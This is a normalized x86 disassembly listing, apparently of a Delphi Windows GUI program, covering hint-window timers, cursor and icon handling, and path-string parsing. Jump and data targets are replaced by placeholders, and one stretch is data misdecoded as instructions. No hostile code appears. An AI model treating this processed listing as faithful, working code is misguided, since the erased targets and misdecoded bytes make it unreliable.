pop ebx
retn
mov bl 0x1
sub_46b6a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46b6ec
push sub_469330
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46b8a0
sub_46b714
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406e68
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_449ad0
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_448864
call sub_469310
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46b8a0
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406e68
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_449ad0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46b8a0
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_46b6a8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44b16c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_46bb38
jmp r-xdata
sub_46b824
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46b6ec
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_46bb38
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46b85c
jmp r-xdata
sub_46b85c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_450adc
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4507d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4507d8
push eax
call ShowWindow
sub_46b8a0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46b85c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_469498
mov eax ebx
call sub_46b6ec
sub_46b8d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46ba1a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_425838
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_408034
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46b9eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4258f0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b9f2
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4027e4
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_46b8c8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_46b8c8
mov [ ebp - 0x4 ] eax
sub_46b9f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46ba2c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403254
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40319c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46ba8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46bb26
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bb2d
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404094
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4243d4
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c854
mov ebx eax
inc ebx
sub_46bb38
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_40493c
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46bebe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46b8a0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46b6a8
jmp r-xdata
call sub_461bd0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bec5
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a0c
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_448864
call sub_469310
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_46b8d8
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_4686d4
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_449958
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_449afc
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4692d8
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_447084
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_40403c
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44b16c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46ba2c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_449ad0
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_449ad0
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_44a158
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_469424
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46ba8c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_46b6a8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46b6a8
jmp r-xdata
sub_46becc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403ff8
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403ff8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46bf2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_46bf58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44b16c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44b16c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_4569a0
sub_46bfe8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46c010
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46c0b9
dec [ eax ]
pushfd
arpl [ eax + eax ] ax
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46c117
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c11e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_46197c
mov eax sub_461bfc
call sub_41a104
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46c174
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_404264
cmp edi eax
jg r-xdata
mov eax esi
call sub_404264
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40c624
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_404264
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_404264
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40c624
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_404264
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_404264
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c624
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c624
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_46c2c8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_404264
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_46c174
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_46c344
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_46c364
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46c56e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_403ff8
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46c2c8
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_404264
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_404264
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_404264
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c575
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_403fc8
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_4044c4
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_46c344
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_40418c
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_404264
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_4044c4
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_404324
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4044c4
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_46c344
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40418c
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_404264
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_4044c4
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_404324
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_404264
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404264
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46c174
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_40418c
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_4042b0
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46c174
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_40418c
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_40426c
sub_46c580
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_404264
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_404264
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_404264
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_404264
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_46c174
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_46c604
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_404264
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_404264
mov edx eax
dec edx
mov eax esi
call sub_46c174
cmp al 0x6
jne r-xdata
mov eax esi
call sub_404264
mov edx eax
sub edx 0x2
mov eax esi
call sub_46c174
cmp al 0x6
je r-xdata
mov eax esi
call sub_404264
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_404264
mov edx eax
sub edx 0x3
mov eax esi
call sub_46c174
cmp al 0x6
jne r-xdata
sub_46c670
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46c6ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_403fa4
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c6f4
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_46c174
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_40418c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40426c
mov eax [ ebp - 0x4 ]
sub_46c6fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c741
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46c670
mov eax [ ebp - 0x4 ]
call sub_404264
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c748
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_46c750
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_404264
mov edx eax
mov eax edi
call sub_46c6fc
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_404264
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_46c174
cmp al 0x3
je r-xdata
sub_46c7ac
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_46c750
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_46c174
dec eax
sub al 0x2
setb bl
sub_46c7d4
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_46c959
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46c2c8
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_403ff8
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46c2c8
mov [ ebp - 0x9 ] al
